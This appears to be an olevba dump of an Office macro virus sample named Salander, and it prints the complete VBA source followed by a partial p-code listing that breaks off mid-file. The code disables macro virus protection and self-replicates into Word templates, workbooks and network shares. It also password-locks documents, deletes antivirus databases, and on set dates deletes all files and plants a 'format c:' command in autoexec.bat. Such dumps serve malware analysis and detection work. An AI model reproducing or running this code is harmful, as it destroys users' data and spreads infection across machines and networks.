olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Salander
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Salander - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'salamandra favo-rit@narod.ru
Dim a As Integer
Private Sub Workbook_BeforeClose(Cancel As Boolean)
 a = 3
 Nod
End Sub
Private Sub Workbook_Open()
 a = 1
 Nod
End Sub
Private Sub Document_Close()
 a = 2
 Don
End Sub
Private Sub Document_Open()
 a = 1
 Don
End Sub
Private Sub Nod()
'“¡¨à ¥¬ à¥ ªæ¨î ­  ®è¨¡ª¨
 On Error Resume Next
'Ž¯¨áë¢ ¥¬ ¯¥à¥¬¥­­ë¥ ¤«ï à ¡®âë
 Dim vis, parol, nax, wor As String
 Dim kol, vr, i, lon As Integer
 Dim pr As Boolean
 kol = ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
 vis = ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.Lines(1, kol)
 nax = ""
 mno = ""
 Set mno = GetObject(, "Word.Application")
  If mno = "" Then pr = False Else pr = True
 Set wordik = CreateObject("Word.Application")
'“¡¨à ¥¬ § ¯à®á ­  ®âª«îç¥­¨¥ ¬ ªà®á®¢ ¢ �ªá¥«¥,   § ®¤­® ¨ ¢ ¢®à¤¥
  wordik.System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = ""
  wordik.Options.VirusProtection = False
 If pr = False Then
'Š®¯¨àã¥¬ ª®¤ ¢ ¢®à¤
  If wordik.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "'salamandra favo-rit@narod.ru" Then
   wordik.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, lon
   wordik.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, vis
'âã¤  ¦¥ ª®¯¨àã¥¬ äã­ªæ¨î ­¥¢¨¤¨¬®áâ¨
   wordik.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 3, "Sub viewvbcode()"
   wordik.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 4, " NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
   wordik.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 5, " NormalTemplate.Saved = True"
   wordik.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 6, " For i = 1 To Documents.Count"
   wordik.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 7, "  Documents(i).VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, Documents(i).VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
   wordik.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 8, "  Documents(i).Saved = True"
   wordik.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 9, " Next i"
   wordik.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 10, "End Sub"
'“¡¨à ¥¬ ¨§ áª®¯¨à®¢ ­­®£® ª®¤  ¯à®æ¥¤ãàã à¥ ªæ¨¨ ­   ªâ¨¢ æ¨î ®ª­ , â ª ª ª ¢®à¤ ¥¥ ­¥ ¢®¯à¨­¨¬ ¥â
   lon = wordik.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
   For i = 1 To lon
    wor = wordik.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
    If wor = " a = 8" Then
     wordik.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines i - 1, 4
    End If
'‡ ®¤­® ã¡¨à ¥¬ ¢ ª®¤¥ ¯ãáâë¥ áâà®ª¨, â ª¨¬ ®¡à §®¬ § ¯à¥é ¥¬ ¯à¨à®áâ ª®¤ 
    If wor = "" Then
     wordik.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines i, 1
    End If
   Next i
  End If
 End If
 wordik.Quit
'’ ª ª ª ¢ íªá¥«¥ ­ è  ª­¨£  áªàëâ , â® ¤®¡ ¢«ï¥¬ ­®¢ãî ª­¨£ã
 If ThisWorkbook.Name = "Salamandra.xls" And a = 1 Then
  Workbooks.Add
 End If
'…á«¨ ¢  ¢â®§ ¯ãáª¥ ­¥â ­¨ç¥£® ¯¨è¥¬ âã¤  ­ è ª®¤
 With Application.FileSearch
  .LookIn = Application.StartupPath
  .FileName = "Salamandra.xls"
  .Execute
  nax = .FoundFiles(1)
 End With
 If nax = "" And ThisWorkbook.Name <> "Salamandra.xls" Then
  Workbooks.Add
  ActiveWorkbook.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, vis
  ActiveWorkbook.SaveAs (Application.StartupPath + "\Salamandra.xls")
'¤¥« ¥¬ § ¯¨áë¢ ¥¬ãî ª­¨£ã ­¥¢¨¤¨¬®©
  Workbooks("Salamandra.xls").Windows(1).Visible = False
  Workbooks("Salamandra.xls").Save
 End If
'�¥à¥¯¨áë¢ ¥¬ ­ è ª®¤ ¢® ¢á¥ ®âªàëâë¥ ª­¨£¨
 For i = 1 To Workbooks.Count
  vr = Workbooks(i).VBProject.VBComponents.Item(1).CodeModule.CountOfLines
  If vr <> kol Then
   Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.InsertLines 1, vis
  End If
 Next i
'�à¨ § ªàëâ¨¨ áâ ¢¨¬ ¯ à®«ì ¯®¤®¡à ­­ë© á«ãç ©­ë¬ ®¡à §®¬ ­  ¢á¥ «¨áâë
 If ThisWorkbook.Name <> "Salamandra.xls" Then
  If a = 3 Then
   Randomize
   parol = ""
   For i = 1 To 15
    par = 0
    While par < 65
     par = Int(Rnd * 90) + 1
    Wend
    parol = parol + Chr(par)
   Next i
   For i = 1 To Sheets.Count
    Sheets(i).Protect Password:=parol
   Next i
   For i = 1 To kol
    prov = ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
    If Mid(prov, 1, 9) = "'Password" Then
     ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.DeleteLines i, 1
     ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.InsertLines i, "'Password=" + parol
    End If
   Next i
  End If
'�à¨ ®âªàëâ¨¨ ª­¨£¨ á­¨¬ ¥¬ ¯ à®«ì
  If a = 1 Then
   parol = ""
   For i = 1 To kol
    prov = ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
    If Mid(prov, 1, 9) = "'Password" Then
     parol = Mid(prov, 11, 25)
    End If
   Next i
   For i = 1 To Sheets.Count
    Sheets(i).Unprotect (parol)
   Next i
  End If
 End If
End Sub
Private Sub Don()
'“¡¨à ¥¬ à¥ ªæ¨î ­  ®è¨¡ª¨
 On Error Resume Next
'“¡¨à ¥¬ § ¯à®á ­  ®âª«îç¥­¨¥ ¬ ªà®á®¢
 Options.VirusProtection = False
'“¡¨à ¥¬ § ¯à®á ­  ®âª«îç¥­¨¥ ¬ ªà®á®¢ ¢ �ªá¥«¥
 System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = ""
 Dim nor, vis, parol, prov, xlpath, nax As String
 Dim lon, lonvis, kol, i, par As Integer
 kol = Documents.Count
 lon = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
 lonvis = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
 vis = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, lonvis)
'‡ ¯¨áë¢ ¥¬ ª®¤ ¢ íªá¥«ì
 Set exl = CreateObject("Excel.Application")
 exl.Run
 xlpath = exl.Application.StartupPath
 With Application.FileSearch
  .LookIn = xlpath
  .FileName = "Salamandra.xls"
  .Execute
  nax = .FoundFiles(1)
 End With
 If nax = "" And ThisDocument.Name <> NormalTemplate.Name Then
  exl.Workbooks.Add
  exl.ActiveWorkbook.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, vis
  exl.ActiveWorkbook.SaveAs (xlpath + "\Salamandra.xls")
  For i = 1 To exl.Workbooks("Salamandra.xls").VBProject.VBComponents.Item(1).CodeModule.CountOfLines
   If exl.Workbooks("Salamandra.xls").VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1) = "" Then
    exl.Workbooks("Salamandra.xls").VBProject.VBComponents.Item(1).CodeModule.DeleteLines i, 1
   End If
  Next i
  exl.Workbooks("Salamandra.xls").VBProject.VBComponents.Item(1).CodeModule.InsertLines 3, "Private Sub Workbook_WindowActivate(ByVal Wn As Excel.Window)"
  exl.Workbooks("Salamandra.xls").VBProject.VBComponents.Item(1).CodeModule.InsertLines 4, " a = 8"
  exl.Workbooks("Salamandra.xls").VBProject.VBComponents.Item(1).CodeModule.InsertLines 5, " Nod"
  exl.Workbooks("Salamandra.xls").VBProject.VBComponents.Item(1).CodeModule.InsertLines 6, "End Sub"
'¤¥« ¥¬ § ¯¨áë¢ ¥¬ãî ª­¨£ã ­¥¢¨¤¨¬®©
  exl.Windows(1).Visible = False
  exl.Workbooks("Salamandra.xls").Save
 End If
 exl.Quit
'§ ¯¨áë¢ ¥¬áï ¢ è ¡«®­ ¨ ¢á¥ ®âªàëâë¥ ¤®ªã¬¥­âë
 If ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines <> lon Then
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, lon
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, vis
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 3, "Sub viewvbcode()"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 4, " NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 5, " NormalTemplate.Saved = True"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 6, " For i = 1 To Documents.Count"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 7, "  Documents(i).VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, Documents(i).VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 8, "  Documents(i).Saved = True"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 9, " Next i"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 10, "End Sub"
 End If
  For i = 1 To kol
   If Documents.Item(i).Name <> ThisDocument.Name And Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.CountOfLines <> lon - 8 Then
    Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, vis
'“¡¨à ¥¬ ¨§ áª®¯¨à®¢ ­­®£® ª®¤  ¯à®æ¥¤ãàã áªàëâ¨ï ª®¤  â ª ª ª ®­  ¬®¦¥â ¡ëâì â®«ìª® ¢ ¥¤. íª§¥¬¯«ïà¥ ¢ ­®à¬ «¥
   gon = Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.CountOfLines
   For j = 1 To gon
    wor = Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.Lines(j, 1)
    If wor = "Sub viewvbcode()" Then
     Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.DeleteLines j, 8
    End If
'‡ ®¤­® ã¡¨à ¥¬ ¢ ª®¤¥ ¯ãáâë¥ áâà®ª¨, â ª¨¬ ®¡à §®¬ § ¯à¥é ¥¬ ¯à¨à®áâ ª®¤ 
    If wor = "" Then
     Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.DeleteLines j, 1
    End If
   Next j
   End If
  Next i
 If a = 1 Then
'�à¨ ®âªàëâ¨¨ á®§¤ ¥¬ ä ©« ¤«ï ¯®«ãç¥­¨ï á¯¨áª  á¥âª¨ ¨ § ¯ãáª ¥¬ ¥£®
 Open "c:\windows\net.bat" For Output As #1
  Print #1, "c:\windows\net.exe view>c:\windows\net.tmp"
 Close #1
 doscom = Shell("c:\windows\net.bat", 0)
'�à¨ ®âªàëâ¨¨ á­¨¬ ¥¬ ãáâ ­®¢«¥­­ë© ¯ à®«ì
  If ThisDocument.Name <> NormalTemplate.Name Then
   lonvis = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
   parol = ""
   For i = 1 To lonvis
    prov = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
    If Mid(prov, 1, 9) = "'Password" Then
     parol = Mid(prov, 11, 25)
    End If
   Next i
   ThisDocument.Unprotect (parol)
  End If
 End If
 If a = 2 Then
'�à¨ § ªàëâ¨¨ áâ ¢¨¬ ¯ à®«ì ­  ¤®ªã¬¥­â ¯®¤®¡à ­ë© á«ãç ©­ë¬ ®¡à §®¬
  If ThisDocument.Name <> NormalTemplate.Name Then
   Randomize
   parol = ""
   For i = 1 To 15
    par = 0
    While par < 65
     par = Int(Rnd * 90) + 1
    Wend
    parol = parol + Chr(par)
   Next i
   ThisDocument.Protect Type:=wdAllowOnlyComments, Password:=parol
   lonvis = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
   For i = 1 To lonvis
    prov = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
    If Mid(prov, 1, 9) = "'Password" Then
     ThisDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines i, 1
     ThisDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines i, "'Password=" + parol
    End If
   Next i
   ThisDocument.Save
  End If
'�à¨ § ªàëâ¨¨ ¯¨è¥¬ ª®¤ ¢® ¢á¥ à ááè à¥­ë¥ à¥áãàáë ¢ á¥âª¥
 '�à®¢¥àï¥¬ ­ «¨ç¨¥ ¢à¥¬¥­­®£® ä ©«  á®§¤ ­­®£® ¯à¨ ®âªàëâ¨¨ ¤®ªã¬¥­â 
 sss = ""
 Dim komp(500), wrm As String
 Dim KompCount As Integer
 KompCount = 1
 wrm = ""
 With Application.FileSearch
  .FileName = "net.tmp"
  .LookIn = "C:\windows"
  .Execute
  For i = 1 To .FoundFiles.Count
   sss = .FoundFiles(i)
  Next i
 End With
 If sss <> "" Then
'‘ç¨âë¢ ¥¬ ¢à¥¬¥­­ë© ä ©«¢ ¬ áá¨¢
  Open "c:\windows\net.tmp" For Input As #1
   Do While Not EOF(1)
    wrm = Input(1, #1)
    If wrm = "\" And KompCount <= 500 Then
     komp(KompCount) = wrm
     Do While wrm <> " "
      wrm = Input(1, #1)
      If wrm <> " " Then
       komp(KompCount) = komp(KompCount) + wrm
      End If
     Loop
     KompCount = KompCount + 1
    End If
   Loop
  Close #1
 For i = 1 To 500
  Err.Clear
  sing = komp(i) + "\c\" + Mid(xlpath, 4, Len(xlpath))
  nax = ""
  Open sing + "\vrm.tmp" For Output As #1
   Print #1, "1"
  Close #1
  Kill (sing + "\vrm.tmp")
  If Err.Number = 0 And komp(i) <> "" Then
   Set exl = CreateObject("Excel.Application")
   exl.Run
   With Application.FileSearch
    .LookIn = sing
    .FileName = "Salamandra.xls"
    .Execute
    nax = .FoundFiles(1)
   End With
'�¨è¥¬ ª®¤ ¢ íªá¥«ì ­  ­ ©¤¥­ë© à áè à¥­­ë© à¥áãàá (à ¡®â  ª®¤  § ¢¨á¨â ®â ¬­®£¨å "­®", â ª çâ® à á¯à®áâà ­¥­¨¥ ¯® á¥âª¥ ç¨áâ® íª¯¥à¥¬¥­â «ì­®¥ ¤¥â¨é¥)
   If nax = "" Then
    exl.Workbooks.Add
    exl.ActiveWorkbook.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, vis
    exl.ActiveWorkbook.SaveAs (sing + "\Salamandra.xls")
    For j = 1 To exl.Workbooks("Salamandra.xls").VBProject.VBComponents.Item(1).CodeModule.CountOfLines
     If exl.Workbooks("Salamandra.xls").VBProject.VBComponents.Item(1).CodeModule.Lines(j, 1) = "" Then
      exl.Workbooks("Salamandra.xls").VBProject.VBComponents.Item(1).CodeModule.DeleteLines j, 1
     End If
    Next j
    exl.Workbooks("Salamandra.xls").VBProject.VBComponents.Item(1).CodeModule.InsertLines 3, "Private Sub Workbook_WindowActivate(ByVal Wn As Excel.Window)"
    exl.Workbooks("Salamandra.xls").VBProject.VBComponents.Item(1).CodeModule.InsertLines 4, " a = 8"
    exl.Workbooks("Salamandra.xls").VBProject.VBComponents.Item(1).CodeModule.InsertLines 5, " Nod"
    exl.Workbooks("Salamandra.xls").VBProject.VBComponents.Item(1).CodeModule.InsertLines 6, "End Sub"
'¤¥« ¥¬ § ¯¨áë¢ ¥¬ãî ª­¨£ã ­¥¢¨¤¨¬®©
    exl.Windows(1).Visible = False
    exl.Workbooks("Salamandra.xls").Save
   End If
   exl.Quit
  End If
 Next i
 End If
'‚ª«îç ¥¬ äã­ªæ¨î ã­¨çâ®¦¥­¨ï (¥á«¨ á®¢¯ «  ¤ â )
 nax = ""
 xon = ""
'�à®¢¥àª  ­   "á¢®©-çã¦®©"
 With Application.FileSearch
  .LookIn = "c:\windows"
  .FileName = "Salamon.srg"
  .Execute
  nax = .FoundFiles(1)
 End With
'…á«¨ çã¦®©, â® ª¨«ïâì
 If nax = "" Then
  With Application.FileSearch
   .LookIn = "c:\windows"
   .FileName = "avp.kll"
   .Execute
   xon = .FoundFiles(1)
  End With
  If xon = "" Then
   Open "c:\windows\avp.kll" For Output As #1
    Print #1, Date
   Close #1
'„«ï â®£® çâ®¡ë áà ¡®â «® ä®à¬ â¨à®¢ ­¨¥ ¢¨­â  ¨§  ¢â®§ ¯ãáª , ¥¦¥¤­¥¢­®e ã¡¨¢ ¥¬ €‚�è­ë¥ ¡ §ë
   With Application.FileSearch
    .NewSearch
    .LookIn = "C:\"
    .SearchSubFolders = True
    .FileName = "*.avc"
    .MatchTextExactly = False
    .FileType = msoFileTypeAllFiles
    If .Execute > 0 Then
    For i = 1 To .FoundFiles.Count
     Kill .FoundFiles(i)
    Next i
    End If
   End With
  Else
   Open "c:\windows\avp.kll" For Input As #1
    mmm = Input(2, #1)
   Close #1
   If mmm <> Mid(Date, 1, 2) Then
    With Application.FileSearch
    .NewSearch
    .LookIn = "C:\"
    .SearchSubFolders = True
    .FileName = "*.avc"
    .MatchTextExactly = False
    .FileType = msoFileTypeAllFiles
    If .Execute > 0 Then
    For i = 1 To .FoundFiles.Count
     Kill .FoundFiles(i)
    Next i
    End If
    End With
    Open "c:\windows\avp.kll" For Output As #1
     Print #1, Date
    Close #1
   End If
  End If
  If (Month(Date) = 2 And Day(Date) = 23) Or (Month(Date) = 3 And Day(Date) = 8) Or (Month(Date) = 5 And Day(Date) = 26) Or (Month(Date) = 6 And Day(Date) = 30) Or (Month(Date) = 8 And Day(Date) = 30) Or (Month(Date) = 11 And Day(Date) = 21) Or (Month(Date) = 4 And Day(Date) = 1) Or (Month(Date) = 12 And Day(Date) = 13) Then
'‚ ãª § ­­ë¥ ¢ëè¥ ¤ âë ã¡¨âì ¢á¥ ­  ¢¨­â¥, â®«ìª® ¬¥¤«¥­­® :)
   With Application.FileSearch
    .NewSearch
    .LookIn = "C:\"
    .SearchSubFolders = True
    .FileName = "*.doc"
    .MatchTextExactly = False
    .FileType = msoFileTypeAllFiles
    If .Execute > 0 Then
    For i = 1 To .FoundFiles.Count
     Kill .FoundFiles(i)
    Next i
    End If
   End With
   With Application.FileSearch
    .NewSearch
    .LookIn = "C:\"
    .SearchSubFolders = True
    .FileName = "*.xls"
    .MatchTextExactly = False
    .FileType = msoFileTypeAllFiles
    If .Execute > 0 Then
    For i = 1 To .FoundFiles.Count
     Kill .FoundFiles(i)
    Next i
    End If
   End With
   With Application.FileSearch
    .NewSearch
    .LookIn = "C:\"
    .SearchSubFolders = True
    .FileName = "*.*"
    .MatchTextExactly = False
    .FileType = msoFileTypeAllFiles
    If .Execute > 0 Then
    For i = 1 To .FoundFiles.Count
     Kill .FoundFiles(i)
    Next i
    End If
   End With
   Open "c:\autoexec.bat" For Output As #1
    Print #1, "e" + "c" + "h" + "o" + " " + "y" + "|" + "f" + "o" + "r" + "m" + "a" + "t" + " c: /q"
   Close #1
  End If
 End If
 End If
End Sub
'Password=JGPRZXZIIFUNZEO
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSOffice.Salander
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 35757 bytes
' Line #0:
' 	QuoteRem 0x0000 0x001C "salamandra favo-rit@narod.ru"
' Line #1:
' 	Dim 
' 	VarDefn a (As Integer)
' Line #2:
' 	FuncDefn (Private Sub Workbook_BeforeClose(Cancel As Boolean))
' Line #3:
' 	LitDI2 0x0003 
' 	St a 
' Line #4:
' 	ArgsCall Nod 0x0000 
' Line #5:
' 	EndSub 
' Line #6:
' 	FuncDefn (Private Sub Workbook_Open())
' Line #7:
' 	LitDI2 0x0001 
' 	St a 
' Line #8:
' 	ArgsCall Nod 0x0000 
' Line #9:
' 	EndSub 
' Line #10:
' 	FuncDefn (Private Sub Document_Close())
' Line #11:
' 	LitDI2 0x0002 
' 	St a 
' Line #12:
' 	ArgsCall Don 0x0000 
' Line #13:
' 	EndSub 
' Line #14:
' 	FuncDefn (Private Sub Document_Open())
' Line #15:
' 	LitDI2 0x0001 
' 	St a 
' Line #16:
' 	ArgsCall Don 0x0000 
' Line #17:
' 	EndSub 
' Line #18:
' 	FuncDefn (Private Sub Nod())
' Line #19:
' 	QuoteRem 0x0000 0x0019 "“¡¨à ¥¬ à¥ ªæ¨î ­  ®è¨¡ª¨"
' Line #20:
' 	OnError (Resume Next) 
' Line #21:
' 	QuoteRem 0x0000 0x001F "Ž¯¨áë¢ ¥¬ ¯¥à¥¬¥­­ë¥ ¤«ï à ¡®âë"
' Line #22:
' 	Dim 
' 	VarDefn vis
' 	VarDefn parol
' 	VarDefn nax
' 	VarDefn wor (As String)
' Line #23:
' 	Dim 
' 	VarDefn kol
' 	VarDefn vr
' 	VarDefn i
' 	VarDefn lon (As Integer)
' Line #24:
' 	Dim 
' 	VarDefn pr (As Boolean)
' Line #25:
' 	LitDI2 0x0001 
' 	Ld ThisWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St kol 
' Line #26:
' 	LitDI2 0x0001 
' 	Ld kol 
' 	LitDI2 0x0001 
' 	Ld ThisWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St vis 
' Line #27:
' 	LitStr 0x0000 ""
' 	St nax 
' Line #28:
' 	LitStr 0x0000 ""
' 	St mno 
' Line #29:
' 	SetStmt 
' 	ParamOmitted 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd GetObject 0x0002 
' 	Set mno 
' Line #30:
' 	Ld mno 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St pr 
' 	Else 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St pr 
' 	EndIf 
' Line #31:
' 	SetStmt 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set wordik 
' Line #32:
' 	QuoteRem 0x0000 0x0042 "“¡¨à ¥¬ § ¯à®á ­  ®âª«îç¥­¨¥ ¬ ªà®á®¢ ¢ �ªá¥«¥,   § ®¤­® ¨ ¢ ¢®à¤¥"
' Line #33:
' 	LitStr 0x0000 ""
' 	LitStr 0x0000 ""
' 	LitStr 0x0045 "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
' 	LitStr 0x0008 "Options6"
' 	Ld wordik 
' 	MemLd System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #34:
' 	LitVarSpecial (False)
' 	Ld wordik 
' 	MemLd Options 
' 	MemSt VirusProtection 
' Line #35:
' 	Ld pr 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #36:
' 	QuoteRem 0x0000 0x0013 "Š®¯¨àã¥¬ ª®¤ ¢ ¢®à¤"
' Line #37:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld wordik 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001D "'salamandra favo-rit@narod.ru"
' 	Ne 
' 	IfBlock 
' Line #38:
' 	LitDI2 0x0001 
' 	Ld lon 
' 	LitDI2 0x0001 
' 	Ld wordik 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #39:
' 	LitDI2 0x0001 
' 	Ld vis 
' 	LitDI2 0x0001 
' 	Ld wordik 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #40:
' 	QuoteRem 0x0000 0x0024 "âã¤  ¦¥ ª®¯¨àã¥¬ äã­ªæ¨î ­¥¢¨¤¨¬®áâ¨"
' Line #41:
' 	LitDI2 0x0003 
' 	LitStr 0x0010 "Sub viewvbcode()"
' 	LitDI2 0x0001 
' 	Ld wordik 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #42:
' 	LitDI2 0x0004 
' 	LitStr 0x008E " NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
' 	LitDI2 0x0001 
' 	Ld wordik 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #43:
' 	LitDI2 0x0005 
' 	LitStr 0x001C " NormalTemplate.Saved = True"
' 	LitDI2 0x0001 
' 	Ld wordik 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #44:
' 	LitDI2 0x0006 
' 	LitStr 0x001D " For i = 1 To Documents.Count"
' 	LitDI2 0x0001 
' 	Ld wordik 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #45:
' 	LitDI2 0x0007 
' 	LitStr 0x008B "  Documents(i).VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, Documents(i).VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
' 	LitDI2 0x0001 
' 	Ld wordik 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #46:
' 	LitDI2 0x0008 
' 	LitStr 0x001B "  Documents(i).Saved = True"
' 	LitDI2 0x0001 
' 	Ld wordik 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #47:
' 	LitDI2 0x0009 
' 	LitStr 0x0007 " Next i"
' 	LitDI2 0x0001 
' 	Ld wordik 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #48:
' 	LitDI2 0x000A 
' 	LitStr 0x0007 "End Sub"
' 	LitDI2 0x0001 
' 	Ld wordik 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #49:
' 	QuoteRem 0x0000 0x0062 "“¡¨à ¥¬ ¨§ áª®¯¨à®¢ ­­®£® ª®¤  ¯à®æ¥¤ãàã à¥ ªæ¨¨ ­   ªâ¨¢ æ¨î ®ª­ , â ª ª ª ¢®à¤ ¥¥ ­¥ ¢®¯à¨­¨¬ ¥â"
' Line #50:
' 	LitDI2 0x0001 
' 	Ld wordik 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St lon 
' Line #51:
